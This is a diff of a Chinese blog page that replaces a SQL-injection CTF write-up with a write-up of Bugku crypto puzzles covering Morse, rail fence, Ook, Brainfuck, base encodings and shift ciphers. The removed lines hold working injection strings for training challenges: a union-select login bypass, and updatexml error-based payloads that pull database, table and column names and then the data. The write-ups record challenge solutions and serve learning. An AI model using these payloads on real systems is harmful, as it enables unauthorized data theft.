@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="SQL注入CTF, Keep-Boom">
+    <meta name="keywords" content="Bugku-Crypto, Keep-Boom">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SQL注入CTF | Keep-Boom</title>
+    <title>Bugku-Crypto | Keep-Boom</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SQL注入CTF</h1>
+                    <h1 class="description center-align post-title">Bugku-Crypto</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-12-16
+                    2020-12-19
                 </div>
                 
 
@@ -459,63 +459,52 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="GXYCTF2019-BabySQLi1"><a href="#GXYCTF2019-BabySQLi1" class="headerlink" title="[GXYCTF2019]BabySQLi1"></a>[GXYCTF2019]BabySQLi1</h3><p>补充小知识：</p>
-<p>常见的加密方式</p>
-<p>base32  由大写字母和数字或最后面有三个=构成</p>
-<p>base64  由大小写字母和数字或最后面有两个=构成</p>
-<p>md5 加密</p>
-<p>等（作者会了再补充）</p>
-<p>界面</p>
-<p><img src="D:\boke\blog\source\images\8.png"></p>
-<p>①最开始尝试 admin,admin。出现wrong pass！接着尝试a,1。出现wrong user。所以一定存在这admin这个用户。</p>
-<p>②接着尝试注入  ’   注入报错。加注释符#返回正常。</p>
-<p>③结合burpsuite爆破发现过滤了order or 等一些关键字！但没过滤union select 逐个尝试发现有3列。</p>
-<p>之后尝试都是出现not hack me ！用burpsuite拦截看响应包会发现</p>
-<pre><code>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</code></pre>
-<p>由大写字母和数字构成大概率就是base32</p>
-<p>解密后出现</p>
-<p>。。。。。。==</p>
-<p>出现两个= ，明显是base64加密</p>
-<p>解密后出现</p>
-<p>select * from user where username = ‘$name’</p>
-<p>④之后没啥思路看了大佬的博客是说</p>
-<p>程序大概就是</p>
-<p>验证username是否正确，正确了再验证password是否正确，正确才输出。但密码我们不知道怎么办呢？</p>
-<p>⑤知识补充</p>
-<p>如果数据库中不存在某个数据但你 输入</p>
-<pre><code>select * from users where id=1 union select 1,&#39;admin&#39;,&#39;1&#39;;</code></pre>
-<p>会生成临时用户名为admin，密码为1的虚拟数据如：</p>
-<pre><code>+----+----------+----------+
-| id | username | password |
-+----+----------+----------+
-|  1 | Dumb     | Dumb     |
-|  1 | admin    | 1        |
-+----+----------+----------+</code></pre>
-<p>一般数据库里的密码都是经过加密的，所以测试几次会发现这里是用md5进行加密。我们就可以构造语句</p>
-<p>输入密码是123，数据库存的经过md5加密的密码是202cb962ac59075b964b07152d234b70</p>
-<pre><code>name=ad&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39;#&amp;pw=123</code></pre>
-<p>flag就出来了！</p>
-<h3 id="极客大挑战2019-HardSQL"><a href="#极客大挑战2019-HardSQL" class="headerlink" title="[极客大挑战2019]HardSQL"></a>[极客大挑战2019]HardSQL</h3><p>这关主要是对or,and,空格等都进行了过滤。可以用burpsuite爆破来查询出过滤的关键字。</p>
-<p>①注入点查询，发现是字符型。</p>
-<p>②这里有报错回显所以可以考虑利用报错注入。</p>
-<p>③注出数据库</p>
-<pre><code>0&#39;^updatexml(null,concat(0x3a,(select(database()))),null)#</code></pre>
-<p>注意：这里后台应该是检查到过滤字符就会出现*<u><strong>你可别被我逮住了，臭弟弟</strong></u>*这句话，所以不能有空格的出现！</p>
-<p>④得到数据库为 geek</p>
-<p>注出表名</p>
-<pre><code>0&#39;^updatexml(null,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))),null)#</code></pre>
-<p>注：这里=被过滤，可以用like,in,rlike,regexp来替换</p>
-<p>⑤得到表名为 H4rDsq1</p>
-<p>注出字段名</p>
-<pre><code>0&#39;^updatexml(null,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name)in(&#39;H4rDsq1&#39;))),null)#</code></pre>
-<p>⑥得到字段名为 id,username,password</p>
-<p>注出数据</p>
-<pre><code>0&#39;^updatexml(null,concat(0x3a,(select(group_concat(concat_ws(&#39;~&#39;,id,username,password)))from(H4rDsq1))),null)#</code></pre>
-<p>⑦得到这样的数据</p>
-<pre><code>XPATH syntax error: &#39;:1~flag~flag&#123;7f82b7b1-82d2-4dff-&#39;</code></pre>
-<p>会发现flag只显示了一段怎么办呢？可以利用right函数注出右边部分</p>
-<p>0’^updatexml(null,concat(0x3a,(select(group_concat(right(password,30)))from(H4rDsq1))),null)#</p>
-<p>⑧拼接出完整的flag！</p>
+                <h3 id=""><a href="#" class="headerlink" title="/.-"></a>/.-</h3><p> ..-./.-../.-/–./—-.–/-../…–/..-./-.-./-…/..-./.—-/–…/..-./—-./…–/—-./—-./…../—–/….-/—–.-</p>
+<p>莫尔斯密码</p>
+<p>一个个解，%u7b={ %u7d=}</p>
+<h3 id="聪明的小羊"><a href="#聪明的小羊" class="headerlink" title="聪明的小羊"></a>聪明的小羊</h3><p>一只小羊翻过了2个栅栏 fa{fe13f590lg6d46d0d0}</p>
+<p>栅栏密码</p>
+<p>这里有说翻过2个，所以应该是2栏</p>
+<h3 id="ok"><a href="#ok" class="headerlink" title="ok"></a>ok</h3><p>Ook. Ook! …..</p>
+<p>把所有Ook内容复制，点Ook! to text 就可以出结果</p>
+<h3 id="lt-gt"><a href="#lt-gt" class="headerlink" title="[+-&lt;&gt;]"></a>[+-&lt;&gt;]</h3><p>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;– -&lt;]&gt;- -.+++      。。。。。</p>
+<p>跟Ook加密解法一样</p>
+<p>注：brainfuck语言用&gt; &lt; + - . , [ ]八种符号来替换C语言的各种语法和命令。Brainfuck是一种极小化的计算机语言，它是由Urban Müller在1993年创建的。由于fuck在英语中是脏话，这种语言有时被称为brainf*ck或brainf**k，甚至被简称为BF。</p>
+<h3 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy_crypto"></a>easy_crypto</h3><p>01 100 010 。。。</p>
+<p>看起来很像二进制加密，但其实不是。其实是莫尔斯密码，把相对应的0都替换为.或-。1也是。试一下第一个解出来是f就是对的。</p>
+<h3 id="简单加密"><a href="#简单加密" class="headerlink" title="简单加密"></a>简单加密</h3><p>e6Z9i<del>]8R</del>U<del>QHE{RnY{QXg</del>QnQ{^XVlRXlp^XI5Q6Q6SKY8jUAA</p>
+<p>最后面是AA很像base64加密最后的==</p>
+<p>A的ASCII码是65，=的ASCII码是61。左移4位</p>
+<p>所以猜测是凯撒密码结合base64加密的。</p>
+<p>先把密文转成对应的ASCII码值，每个值都相对应减4，再转成ASCII对应的字符。出现==</p>
+<p>再把密文进行base64解密就得到flag</p>
+<h3 id="散乱的密文"><a href="#散乱的密文" class="headerlink" title="散乱的密文"></a>散乱的密文</h3><p> lf5{ag024c483549d7fd@@1} 一张纸条上凌乱的写着2 1 6 5 3 4</p>
+<p>就是l=&gt;2,f=&gt;1,5=&gt;6,{=&gt;5,a=&gt;3,g=&gt;4。。。。</p>
+<p>重新按顺序排成123456123456，最后去掉@@</p>
+<h3 id="-1"><a href="#-1" class="headerlink" title=".!?"></a>.!?</h3><p>变种类Ook,跟Ook解法一样</p>
+<h3 id="一段Base64"><a href="#一段Base64" class="headerlink" title="一段Base64"></a>一段Base64</h3><p>未解</p>
+<h3 id="奇怪的密码"><a href="#奇怪的密码" class="headerlink" title="奇怪的密码"></a>奇怪的密码</h3><p>突然天上一道雷电 gndk€rlqhmtkwwp}z</p>
+<p>可以知道gndk对应应该就是flag，把它们转为相对应的ASCII码值，会发现g的ASCII值-1等于f的ASCII码值，n的ASCII值-2等于l的ASCII码值,d的ASCII值-3等于a的ASCII码值，类推下去。</p>
+<h3 id="托马斯-杰斐逊"><a href="#托马斯-杰斐逊" class="headerlink" title="托马斯.杰斐逊"></a>托马斯.杰斐逊</h3><p>这题考的是比尔密码，可以去百度百科看下。</p>
+<p>密钥 2 对应明文 H</p>
+<p>2： &lt;KPBELNACZDTRXMJQOY***<u>HGVSFUWI</u>*** &lt;</p>
+<p>变成</p>
+<p>2： &lt;***<u>HGVSFUWI</u>*** KPBELNACZDTRXMJQOY&lt;   并且作为新的第一行，以此类推。</p>
+<p>最后在倒数第6列会发现bugku，flag应该就在这一列。</p>
+<h3 id="告诉你个秘密"><a href="#告诉你个秘密" class="headerlink" title="告诉你个秘密"></a>告诉你个秘密</h3><p>636A56355279427363446C4A49454A7154534230526D684356445A31614342354E326C4B4946467A5769426961453067</p>
+<p>只有数字且字母为都在G前，猜测为base16编码,进行解码。</p>
+<p>cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g</p>
+<p>有大小写字母，数字，猜测为base64加密，进行解码。</p>
+<p>r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM </p>
+<p>像键盘密码。如r5yG=&gt;t</p>
+<p>得出flag。注：大写</p>
+<h3 id="这不是md5"><a href="#这不是md5" class="headerlink" title="这不是md5"></a>这不是md5</h3><p>666c61677b616537333538376261353662616566357d</p>
+<p>只有数字字母在G前，进行base16解码。</p>
+<h3 id="贝斯家族"><a href="#贝斯家族" class="headerlink" title="贝斯家族"></a>贝斯家族</h3><p>@iH&lt;,{bdR2H;i6*Tm,Wx2izpx2!</p>
+<p>猜测大于base64，一个个试过去，发现是base91编码，进行解码。</p>
+<h3 id="python-N1CTF"><a href="#python-N1CTF" class="headerlink" title="python(N1CTF)"></a>python(N1CTF)</h3><p>未解</p>
+<h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><p>b代表2进制，o代表8进制，d代表10进制，x代表16进制。</p>
+<p>都转化为10进制的值，再对照ASCII表就可解出。</p>
 
             </div>
             <hr/>
@@ -541,7 +530,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2020/12/16/SQL%E6%B3%A8%E5%85%A5CTF/">http://example.com/2020/12/16/SQL%E6%B3%A8%E5%85%A5CTF/</a>
+                    <a href="http://example.com/2020/12/19/Bugku-Crypto/">http://example.com/2020/12/19/Bugku-Crypto/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -750,13 +739,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/12/19/Bugku-Crypto/">
+                <a href="/2020/12/19/base%E5%AE%B6%E6%97%8F/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="Bugku-Crypto">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="base家族">
                         
-                        <span class="card-title">Bugku-Crypto</span>
+                        <span class="card-title">base家族</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -787,13 +776,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/12/12/MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/">
+                <a href="/2020/12/16/SQL%E6%B3%A8%E5%85%A5CTF/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="MySQL基本操作">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="SQL注入CTF">
                         
-                        <span class="card-title">MySQL基本操作</span>
+                        <span class="card-title">SQL注入CTF</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -804,7 +793,7 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-12
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-16
                             </span>
                         <span class="publish-author">
                             
